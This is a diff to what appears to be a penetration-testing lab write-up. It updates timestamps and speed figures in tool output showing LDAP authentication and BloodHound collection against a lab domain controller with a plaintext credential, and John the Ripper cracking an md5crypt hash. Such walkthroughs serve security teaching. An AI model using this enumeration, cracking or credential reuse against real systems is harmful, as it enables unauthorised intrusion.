@@ -332,7 +332,7 @@ LDAP        10.1.90.146     389    DC01             [*] Windows Server 2022 Buil
 LDAP        10.1.90.146     389    DC01             [+] SYSCO.LOCAL\jack.dowland:musicman1 
 LDAP        10.1.90.146     389    DC01             Resolved collection methods: objectprops, session, acl, trusts, psremote, localadmin, group, dcom, container, rdp
 LDAP        10.1.90.146     389    DC01             Done in 0M 21S
-LDAP        10.1.90.146     389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.1.90.146_2026-09-26_174012_bloodhound.zip
+LDAP        10.1.90.146     389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.1.90.146_2026-10-07_194713_bloodhound.zip
 ```
 
 We mark `jack.dowland` as owned, but BloodHound shows no attack paths from the account, so we go back to the Roundcube panel.
@@ -389,10 +389,10 @@ Warning: detected hash type "md5crypt", but the string is also recognized as "md
 Use the "--format=md5crypt-long" option to force loading these as that type instead
 Using default input encoding: UTF-8
 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
-Will run 4 OpenMP threads
+Will run 6 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 Chocolate1       (?)     
-1g 0:00:00:00 DONE (2026-09-26 18:20) 1.754g/s 103747p/s 103747c/s 103747C/s chris93..1softball
+1g 0:00:00:00 DONE (2026-10-07 20:00) 10.00g/s 593280p/s 593280c/s 593280C/s chris93..090902
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
